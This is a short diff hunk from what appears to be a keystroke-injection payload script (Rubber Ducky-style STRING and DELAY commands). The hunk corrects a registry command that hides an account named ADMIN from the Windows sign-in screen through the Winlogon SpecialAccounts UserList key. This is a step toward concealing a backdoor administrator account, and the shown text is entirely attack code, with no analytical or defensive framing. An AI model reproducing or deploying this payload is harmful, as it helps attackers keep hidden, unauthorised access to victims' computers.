@@ -38,7 +38,7 @@ STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
 DELAY 300
 ENTER
 
-STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /v ADMIN /t REG_DWORD /d 0
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v ADMIN /t REG_DWORD /d 0
 DELAY 300
 ENTER
 
